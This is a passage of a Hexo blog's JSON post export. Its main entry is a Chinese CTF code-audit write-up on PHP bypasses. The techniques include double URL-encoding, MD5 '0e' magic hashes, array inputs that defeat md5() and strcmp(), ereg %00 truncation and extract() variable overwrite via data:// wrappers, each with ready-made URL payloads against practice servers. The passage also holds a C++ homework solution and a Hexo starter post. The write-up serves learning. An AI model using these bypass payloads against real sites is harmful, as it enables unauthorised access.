“’属性，双击，将其删掉，按钮便可正常使用。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://singlemindedt.github.io/categories/CTF/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"代码审计","slug":"代码审计ONE","date":"2019-09-03T14:35:18.000Z","updated":"2019-09-04T08:46:22.694Z","comments":true,"path":"2019/09/03/代码审计ONE/","link":"","permalink":"https://singlemindedt.github.io/2019/09/03/代码审计ONE/","excerpt":"","text":"PHP大法（来源：实验吧 解题链接： http://ctf5.shiyanbar.com/DUTCTF/index.php）点开链接只有如上一句话。根据提示 直接访问： index.php.txt （即：http://ctf5.shiyanbar.com/DUTCTF/index.php.txt）得到如下页面：分析代码： 1234567891011121314151617 &lt;?php if(eregi(\"hackerDJ\",$_GET[id])) &#123; //对id进行字符串匹配，若$_GET[id]中有hacker DJ则 //出not allowed!并终止正在执行的进程; echo(\"&lt;p&gt;not allowed!&lt;/p&gt;\"); exit(); &#125; $_GET[id] = urldecode($_GET[id]); //urldecode对字符串进行URL解码;将解码后的//$_GET[id]赋值给$_GET[id]; if($_GET[id] == \"hackerDJ\") //若$_GET[id]的值等于hackerDJ，输出Access granted! //并给出flag: *****************&#125; &#123; echo \"&lt;p&gt;Access granted!&lt;/p&gt;\"; echo \"&lt;p&gt;flag: *****************&#125; &lt;/p&gt;\"; &#125; ?&gt;&lt;br&gt;&lt;br&gt;Can you authenticate to this website? 12345678$_GET说明通过 URL 参数传递给当前脚本的变量的数组Example #1$_GET范例 &lt;?php echo 'Hello ' . htmlspecialchars($_GET[\"name\"]) . '!'; ?&gt;假设用户访问的是 http://example.com/?name=Hannes以上例程的输出类似于： Hello Hannes! 解题思路：有$_GET[id] 所以应该是可以用 ?id= 来构造URLid变量是一个url解码函数前不包含hackerDJ，url解码函数后为hackerDJ的变量，即id在进入url解码函数前必须是hackerDJ的url编码形式 注意：由于在浏览器输入url后会进行一次decode，这段代码中又进行一次decode，所以应对hackerDJ进行两次encode。只进行一次encode，浏览器自动解码后即为hackerDJ,被eregi()拦住，所以要进行二次编码，即对%68%61%63%6B%65%72%44%4A进行url编码。 ① http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%68%61%63%6B%65%72%44%4A ② http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41 或者直接对其中的一个字母进行二次编码： h –&gt; %68 –&gt; %2568构造url: index.php?id=%2568ackerDJ Very easy打开链接直接得到如下代码： 1234$what=$_GET['what'];echo $what;if($what=='flag')echo 'flag&#123;****&#125;'; 分析：如果$what等于flag,则给出flag。解决：http://123.206.87.240:8002/get/?what=flag 得到flag。 Experiment 1打开链接直接出现PHP代码： 123456789101112131415&lt;?php include \"flag.php\"; highlight_file(__FILE__); if (isset($_GET['money'])) &#123; $money=$_GET['money']; if(strlen($money)&lt;=4&amp;&amp;$money&gt;time()&amp;&amp;!is_array($money)) &#123; echo $flag; echo \"&lt;!--By:daoyuan--&gt;\"; &#125; else echo \"Wrong Answer!\"; &#125; else echo \"Wrong Answer!\";?&gt; 代码分析：第一行:告诉我们flag应该就在flag.php中第二行：highlight_file() 函数对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮。 提示：用于高亮的颜色可通过 php.ini 文件进行设置或者通过调用 ini_set() 函数进行设置。 注释：当使用该函数时，整个文件都将被显示，包括密码和其他敏感信息！ 语法：highlight_file(filename,return)filename 必需。规定要显示的文件。return 可选。如果该参数设置为 TRUE，该函数将以字符串形式返回高亮显示的代码，而不是直接进行输出。默认是 FALSE。返回值如果 return 参数设置为 TRUE，该函数将以字符串形式返回高亮显示的代码，而不是直接进行输出。否则，如果成功则返回 TRUE，如果失败则返回 FALSE。If条件：$money的长度&lt;=4；同时&gt;time()；同时不是数组{time() 函数返回自 Unix 纪元（January 1 1970 00:00:00 GMT）起的当前时间的秒数。此处我们直接将其理解为一个很大的数}==PHP中，字符串开头以xex开头，x代表数字。会被转换成科学计数法。 如1e9 == 1×10^9==解决：直接用xex格式如：http://119.23.73.3:5001/web6/?money=10e9 直接得到flag Experiment 2打开链接页面中只有一句话“好像少了点什么”，试着在url后添加index.php~即http://119.23.73.3:5001/web5/index.php~。打开页面发现什么都没有，查看源文件发现果然有PHP文件： 分析代码：9：给出$flag的值为我们最终需要的结果 1moctf&#123;**************&#125; 11：{PHP的isset()函数 一般用来检测变量是否设置格式：bool isset ( mixed var [, mixed var [, …]] )功能：检测变量是否设置返回值：若变量不存在则返回 FALSE若变量存在且其值为NULL，也返回 FALSE若变量存在且值不为NULL，则返回 TURE同时检查多个变量时，每个单项都符合上一条要求时才返回 TRUE，否则结果为 FALSE版本：PHP 3, PHP 4, PHP 5更多说明：使用 unset() 释放变量之后，它将不再是 isset()。PHP函数isset()只能用于变量，传递任何其它参数都将造成解析错误。检测常量是否已设置可使用 defined() 函数。} 1234If条件下对变量$_GET['a']和$_GET['b']赋值，并将其赋值给$a,$b.若$a等于$b则打印Wrong Answer!否则在条件md5($a)==md5($b)下给出$flag，否则打印Wrong Answer！**即此代码的意思时要我们对提供$a,$b使得其值不同，但MD5值相同。** ***弱类型比较——“==”类型转换的规则1、字符串和数字比较，字符串会被转换成数字。 “admin”==0 (true) admin被转换成数字，由于admin是字符串，转换失败，int(admin)=0，所以 比较结果是true。2、混合字符串转换成数字，看字符串的第一个。 “1admin”==1 “2admin”==23、字符串开头以xex开头，x代表数字。会被转换成科学计数法。 1e9 == 1×10^9 注： 12\"admin1\"==1 //false\"admin1\"==0 //true 参考网上资料：当一个字符串当作一个数值来取值，其结果和类型如下:如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内则：该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。 所以我们可以直接找符合xex格式的MD5原参{MD5 算法自诞生之日起，就有很多人试图证明和发现它的不安全之处，即存在碰撞（在对两个不同的内容使用 MD5算法运算的时候，有可能得到一对相同的结果值）–百科}md5的碰撞，在PHP的数的处理中，类似0开头的字符串会被转换成0，因此有md5碰撞。 MD5值(哈希值)相等的问题可以用哈希值碰撞，也可以用数组绕过，如： 1`username[]=1&amp;password[]=2. 解决：http://119.23.73.3:5001/web5/**?a=QNKCDZO&amp;b=s878926199a** ,直接得到flag。 1md5('**QNKCDZO**')==md5('**s878926199a** ')---&gt;True Experiment 2.1题目给出了php代码： 12345678910111213&lt;?phperror_reporting(0);$flag = 'flag&#123;test&#125;';if (isset($_GET['username']) and isset($_GET['password'])) &#123;if ($_GET['username'] == $_GET['password'])print 'Your password can not be your username.';else if (md5($_GET['username']) === md5($_GET['password']))die('Flag: '.$flag);elseprint 'Invalid password';&#125;?&gt; 分析代码：1我们得构造$_GET[‘username’]和$GET[‘password’]的值不相等，同时它们的md5的值相等才能得到flag 因为md5不能处理数组，可以使用数组绕过，md5(数组)会返回FALSE，username[]=1,password[]=2这样弱==下可以实现username!=password,同时会得到FALSE===FALSE使得md5(username)===md5(password)成立。解决：http://123.206.87.240:9009/18.php?username[]=1&amp;password[]=2 直接得到flag。 Experiment 3打开链接得到：细细品味后发现“链接”下真有一个链接。点开得到php代码： 123456789101112&lt;?phpif(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']) &amp;&amp; isset($_GET['v3']))&#123;$v1 = $_GET['v1'];$v2 = $_GET['v2'];$v3 = $_GET['v3'];if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;if(!strcmp($v3, $flag))&#123;echo $flag;&#125;&#125;&#125;?&gt; 分析代码：v1不等于v2同时两者的MD5值相等&lt;此处既可以用MD5的0e漏洞也可以利用数组绕过&gt;由if(!strcmp(v3,flag))需要v3和flag值相同才返回flag的值 strcmp漏洞int strcmp ( string str1,stringstr2 )str1是第一个字符串，str2是第二个字符串。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。 但是如果我们传入非字符串类型的数据的时候，这个函数将发生错误，在5.3之前的php中，显示了报错的警告信息后，将return 0 ! 也就是虽然报了错，但却判定其相等了。 因此，解这道题，就只要传入一个非字符串类型的变量使其报错，又由于前面的否定“！”得到true。解决：http://123.206.31.85:49162/?v1[]=1&amp;v2[]=2&amp;v3[]=1 Experiment 3.2打开链接得到空页，根据给出的php代码： 123456789&lt;?php$flag = \"flag&#123;xxxxx&#125;\";if (isset($_GET['a'])) &#123;if (strcmp($_GET['a'], $flag) == 0) die('Flag: '.$flag);elseprint 'No';&#125;?&gt; 分析代码： 第一行，flag变量被设置为flag{xxxxx}。这并不是我们要提交的flag，真实运行的后端中的flag变量才是真的flag。 第二行，isset函数判断HTTP GET请求中的参数a是否已设置并且非NULL。strcmp函数将a参数与flag相比较，如果一致，则调用die函数。die函数的作用是打印die函数的参数，并立即停止该php后端的运行。那么我们的目标很明显，就是要让php执行到die函数，显示flag。根据上题strcmp漏洞，我们可以直接利用数组绕过比如用”a[]=”解决：http://123.206.87.240:9009/6.php?a[]= ereg截断打开链接同样是一个空白页面，根据给出的php代码： 1234567891011&lt;?php$flag = \"flag\";if (isset ($_GET['password'])) &#123;if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE)echo 'You password must be alphanumeric';else if (strpos ($_GET['password'], '--') !== FALSE)die('Flag: ' . $flag);elseecho 'Invalid password';&#125;?&gt; 分析代码：flag变量被设置为flag，即最终我们需要得到flag变量的内容从而达到真正的flag。isset函数判断HTTP GET请求中的参数password是否已设置并且非NULL ereg()函数 1234567&#123; ereg ( string $pattern , string $string [, array &amp;$regs ] ) : int函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。&#125;ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) !== FALSE由第一个参数正则表达式可知该字符串从头到尾只允许出现字母与数字即a-z、A-Z、0-9. strpos()函数123456&#123; strpos ( string $haystack , mixed $needle [, int $offset = 0 ] ) : int查找字符串在另一字符串中第一次出现的位置。&#125;strpos ($_GET['password'], '--') !== FALSE该字符串必须有“*--*”字符。 这两个条件明显发生冲突，由于ereg()函数存在%00截断，即ereg()读取字符串时，当遇到%00会默认已经读完，不再读取后面的内容，这样我们就可以利用此漏洞在%00后添加“–”从而绕过正则检测。 解决：http://123.206.87.240:9009/19.php?password=12%00--同时，ereg()只能处理字符串，遇到数组做参数返回NULL，条件用强 === （要求两边类型相同），而NULL跟FALSE类型不同,顺利进入下一个条件；strpos()的参数也不能为数组，否则返回NULL，与FALSE类型不同，满足！==条件，故也可以直接传入一个数组。解决：http://123.206.87.240:9009/19.php?password[]=（或http://123.206.87.240:9009/19.php?password[]=1只是一个为空值一个给了个值。） Extract打开链接空白页面，分析给出的php代码： 12345678910&lt;?php$flag='xxx';extract($_GET); if(isset($shiyan))&#123; $content=trim(file_get_contents($flag)); if($shiyan==$content)&#123;echo'flag&#123;xxx&#125;'; &#125; else &#123; echo'Oh.no'; &#125; &#125;?&gt; extract()函数{extract() 函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。该函数返回成功设置的变量数目。但是当变量中有同名的元素时，该函数默认将原有的值给覆盖掉，这就造成了变量覆盖漏洞。} 代码分析：将flag变量设置为xxx；将GET 方法传输进来的值通过extract()函数处理；isset函数判断HTTP GET请求中的参数shiyan是否已设置并且非NULL;if 判断shiyan这个变量和content这个变量是否相等。content 的值是通过读取 flag 变量的值来获取的。如果这个两个变量相等输出 flag 。file_get_contents() — 将整个文件读入一个字符串。trim() — 去除字符串首尾处的空白字符（或者其他字符）。解决：由于我们不知道flag的值是什么？所以我们需要利用extract()函数漏洞，进行变量覆盖，重新给flag变量赋值。只要我们构造的payload使得 $shiyan = $content ，其中 $content 的值又取决于 flag 变量，所以只要 shiyan变量相等于flag变量即可。由于file_get_contents($flag) 中的$flag是一个参数，导致$content的值是空值，所以我们可以构造如下payload：http://123.206.87.240:9009/1.php?shiyan= 这里再引一位大佬的解答：（代码稍有不同）https://zhouxinan.github.io/ 123456789101112&lt;?php$flag='xxx';extract($_GET);if(isset($sixstars)) &#123; $content=trim(file_get_contents($flag)); if ($sixstars==$content) &#123; echo 'flag&#123;xxx&#125;'; &#125; else &#123; echo 'Oh.no'; &#125;&#125;?&gt; 首先，flag变量被设置为’xxx’，一个简单的字符串。接着，后端运行了extract函数，从$_GET数组中将变量导入到当前的符号表。什么意思呢？其实很简单。比如如果我们访问了http://139.224.220.67:23900/dmsj/level2/?sixstars=1，那么`$_GET[&quot;sixstars&quot;]`的值为字符串1。执行`extract($_GET)`;时，就相当于执行了`$sixstars=&#39;1&#39;`。然后，程序将会执行isset($sixstars)。我们看到，为了获取flag，必须执行到echo ‘flag{xxx}’;，所以isset($sixstars)的返回值必须为 TRUE。所以，我们必须通过extract($_GET);将sixstars变量设置为任意值，即使是空字符串也可以。也就是说，即使访问http://139.224.220.67:23900/dmsj/level2/?sixstars=也是可以的。但绝对不能不包含sixstars参数。接着，程序将会执行$content=trim(file_get_contents($flag));。我们分步看。首先会执行file_get_contents($flag)。正常情况下，如果你不通过URL传入flag参数，那么，因为程序的最开始已经执行过$flag=&#39;xxx&#39;;，所以到了这里将会执行file_get_contents(‘xxx’)。file_get_contents函数可以“将整个文件读入一个字符串”。比如如下代码可以将http://www.example.com/网站的源代码读取到homepage变量中并显示出来。 1234&lt;?php$homepage = file_get_contents('http://www.example.com/');echo $homepage;?&gt; 接着，php又会执行trim函数，它将会“去除字符串首尾处的空白字符（或者其他字符）”。最后，php将会执行if ($sixstars==$content)，如果为TRUE，那么将会显示flag。读到这里，你想必已经知道了我们该怎么做：首先，给sixstars变量传入一个值，比如1。然后，给flag变量传入一个我们能控制的网站的地址，并让这个我们能控制的网站的源代码设置为1。由于extract能起到“变量覆盖”的作用，在extract后，flag变量就会被覆盖为我们能控制的网站的地址，而不再是’xxx’，这样当执行到file_get_contents时php后端将会从我们能控制的网站上读取到1，并将其和sixstars变量比较，并返回TRUE，然后就能打印flag。虽然这个方法是可行的，但是今天我要教你一个更简单的方法，那就是php伪协议。我们可以直接给flag变量传入data://text/plain,1。意思是明文1。这样file_get_contents(‘data://text/plain,1’)将会直接返回1，就不需要我们在公网上开一台服务器了。所以，最后我们的payload是：1 http://139.224.220.67:23900/dmsj/level2/?sixstars=1&amp;flag=data://text/plain,1这里再强调一下，给后端传参的方法是：在?后跟变量名字，不同的变量之间用&amp;隔开。","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://singlemindedt.github.io/categories/代码审计/"},{"name":"php","slug":"代码审计/php","permalink":"https://singlemindedt.github.io/categories/代码审计/php/"}],"tags":[{"name":"php","slug":"php","permalink":"https://singlemindedt.github.io/tags/php/"}]},{"title":"加密算法","slug":"加密算法","date":"2019-09-01T14:50:25.000Z","updated":"2019-09-01T14:50:25.208Z","comments":true,"path":"2019/09/01/加密算法/","link":"","permalink":"https://singlemindedt.github.io/2019/09/01/加密算法/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"反序列化","slug":"反序列化","date":"2019-09-01T14:49:34.000Z","updated":"2019-09-01T14:49:35.039Z","comments":true,"path":"2019/09/01/反序列化/","link":"","permalink":"https://singlemindedt.github.io/2019/09/01/反序列化/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"小雏鸟的成人式2","slug":"算法作业one","date":"2019-09-01T09:37:45.000Z","updated":"2019-09-05T14:24:01.539Z","comments":true,"path":"2019/09/01/算法作业one/","link":"","permalink":"https://singlemindedt.github.io/2019/09/01/算法作业one/","excerpt":"","text":"题目描述陶行知先生说：“我们要活的书，不要死的书 ”。 小雏鸟们从书上都是对的到现在能去伪存真的去使用书籍，证明你们长大了。总之就是要有自己的主见，自己的思考。 大白希望大家都能拿到一百分，所以对100这个数以及他的倍数很喜欢。 大白发现，从1开始，一定能找出一个序列从小到大排列，使得每一项都是 恰好能且仅能 被100整除D次。 请你编写程序，找到这个数列里第N个数。 输入多行。每行输入两个整数，表示D和N，N范围[1,100]，D范围[0,2] 输出每行对应输入，给出一个符合题意的整数 样例输入1230 51 112 85 样例输出12351100850000 提示###思路：很容易想到计算方法，其中N=100的情况需要注意，在下面带代码中给出。 题解：12345678910111213141516171819202122232425262728#include &lt;iostream&gt;#include&lt;math.h&gt;using namespace std;int main()&#123; double D,N;//pow(double,double) double n; //避免损失精度 //int s;//最后由于要得到整数而非科学记数法，故需要强制转换一下 //如：2 100 得到1.01e+006转化之后为1010000 //***也可以直接cout&lt;&lt;int(n)转化输出结果 while(cin&gt;&gt;D&gt;&gt;N) &#123; if(1&lt;=N&amp;&amp;N&lt;100&amp;&amp;0&lt;=D&amp;&amp;D&lt;=2) &#123; n=N*(pow(100,D)); //s=n; cout&lt;&lt;int(n)&lt;&lt;endl; &#125; else if(N=100&amp;&amp;0&lt;=D&amp;&amp;D&lt;=2)//当N=100用原来的算法会使结果整除次数加1 &#123; n=101*(pow(100,D)); //s=n; cout&lt;&lt;int(n)&lt;&lt;endl; &#125; else continue; &#125; return 0;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"https://singlemindedt.github.io/categories/算法/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://singlemindedt.github.io/tags/算法/"}]},{"title":"Hello World","slug":"hello-world","date":"2019-08-30T16:00:00.000Z","updated":"2019-09-05T14:30:35.937Z","comments":true,"path":"2019/08/31/hello-world/","link":"","permalink":"https://singlemindedt.github.io/2019/08/31/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://singlemindedt.github.io/tags/Hexo/"}]}]}